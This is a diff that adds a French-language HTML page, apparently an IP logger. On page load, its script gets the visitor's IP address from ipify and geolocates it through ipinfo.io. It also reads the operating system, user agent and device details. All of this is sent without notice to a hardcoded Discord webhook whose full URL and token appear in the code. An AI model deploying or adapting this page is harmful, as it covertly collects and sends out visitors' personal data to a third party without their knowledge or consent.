@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Informations</title>
+</head>
+<body>
+    <h1>Informations de l'utilisateur</h1>
+    
+    <p><strong>Adresse IP:</strong> <span id="ipAddress"></span></p>
+    <p><strong>Adresse:</strong> <span id="address"></span></p>
+    <p><strong>Localisation:</strong> <span id="location"></span></p>
+    <p><strong>Système d'exploitation:</strong> <span id="operatingSystem"></span></p>
+    <p><strong>Marque:</strong> <span id="brand"></span></p>
+    <p><strong>Fabricant:</strong> <span id="manufacturer"></span></p>
+    <p><strong>Encodage:</strong> <span id="encoding"></span></p>
+    <p><strong>User Agent :</strong> <span id="browserType"></span></p>
+    <p><strong>Version :</strong> <span id="mobileManufacturer"></span></p>
+    <p><strong>URL de la page:</strong> <span id="pageURL"></span></p>
+
+    <script>
+        // Fonction pour récupérer l'adresse IP de l'utilisateur
+        function getIPAddress(callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://api.ipify.org?format=json', true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.ip);
+                }
+            };
+            xhr.send();
+        }
+
+        // Fonction pour obtenir la localisation en utilisant l'API ipinfo.io
+        function getLocation(ip, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://ipinfo.io/' + ip + '/json', true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.city + ', ' + response.country);
+                }
+            };
+            xhr.send();
+        }
+
+        // Fonction pour envoyer les informations à un webhook Discord
+        function sendToDiscordWebhook(data) {
+            var webhookURL = 'https://discord.com/api/webhooks/1165335862222016553/0-A_sjuL3x6Rma3qKbevxpJVZSeNj5i2Xzif4p3kpJ7393g5v23sgDxBfTIuGeTLkHhA';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', webhookURL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+
+            var message = {
+                content: "Informations de l'utilisateur",
+                embeds: [
+                    {
+                        title: "Informations de l'utilisateur",
+                        fields: [
+                            { name: " IP ", value: data.ipAddress, inline: true },
+                            { name: " HL ", value: "https://ipinfo.io , add ip to research = result ", inline: true },
+                            { name: " LOC ", value: data.location, inline: true },
+                            { name: " SE ", value: data.operatingSystem, inline: true },
+                            { name: " MF ", value: data.brand, inline: true },
+                            { name: " FB ", value: data.manufacturer, inline: true },
+                            { name: "ECD", value: data.encoding, inline: true },
+                            { name: "US", value: data.browserType, inline: true },
+                            { name: "VE", value: data.mobileManufacturer, inline: true },
+                            { name: "V-GFLP", value: " V-GFLP LSP SRDMG Dev1.29", inline: true },
+                            { name: " BY ", value: "EnesGP PikaYutMG dev", inline: true },
+                            { name: " IP-Loggers ", value: "GRO - 2023 // Line|Section PSAABIP", inline: true },
+                            { name: "URL", value: data.pageURL, inline: true }
+                        ]
+                    }
+                ]
+            };
+
+            xhr.send(JSON.stringify(message));
+        }
+
+        // Obtient l'adresse de l'utilisateur
+        getIPAddress(function(ip) {
+            document.getElementById('ipAddress').textContent = ip;
+
+            getLocation(ip, function(location) {
+                document.getElementById('location').textContent = location;
+            });
+
+            // Envoie les informations au webhook Discord
+            sendToDiscordWebhook({
+                ipAddress: ip,
+                address: document.getElementById('address').textContent,
+                location: document.getElementById('location').textContent,
+                operatingSystem: operatingSystem,
+                brand: brand,
+                manufacturer: manufacturer,
+                encoding: encoding,
+                browserType: browserType,
+                mobileManufacturer: mobileManufacturer,
+                pageURL: window.location.href
+            });
+        });
+
+        // Obtient le système d'exploitation de l'utilisateur
+        var operatingSystem = navigator.platform;
+
+        // Obtient la marque de l'appareil de l'utilisateur
+        var brand = "Non disponible";
+        if (navigator.userAgent.match(/Android/i)) {
+            brand = "Android";
+        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+            brand = "Apple";
+        }
+
+        // Obtient le fabricant de l'appareil de l'utilisateur
+        var manufacturer = "Non disponible";
+        if (operatingSystem.toLowerCase().includes('win')) {
+            manufacturer = "Microsoft";
+            } else if (operatingSystem.toLowerCase().includes('linux')) {
+        manufacturer = "Linux";
+    } else if (operatingSystem.toLowerCase().includes('mac')) {
+        manufacturer = "Apple";
+    }
+
+    // Obtient l'encodage du navigateur
+    var encoding = document.characterSet;
+
+    // Obtient le type de navigateur
+    var browserType = navigator.userAgent;
+
+    // Obtient le fabricant du mobile de l'utilisateur
+    var mobileManufacturer = "Non disponible";
+    var userAgent = navigator.userAgent;
+
+    if (userAgent.match(/Android/i)) {
+        var regex = /Android\s([\w\s]+)\;/;
+        var matches = userAgent.match(regex);
+        if (matches && matches.length > 1) {
+            mobileManufacturer = matches[1];
+        }
+    } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
+        mobileManufacturer = "Apple";
+    }
+
+    // Met à jour les éléments HTML avec les informations de l'utilisateur
+    document.getElementById('operatingSystem').textContent = operatingSystem;
+    document.getElementById('brand').textContent = brand;
+    document.getElementById('manufacturer').textContent = manufacturer;
+    document.getElementById('encoding').textContent = encoding;
+    document.getElementById('browserType').textContent = browserType;
+    document.getElementById('location').textContent = 'Non disponible';
+    document.getElementById('mobileManufacturer').textContent = mobileManufacturer;
+    document.getElementById('pageURL').textContent = window.location.href;
+                     </script>
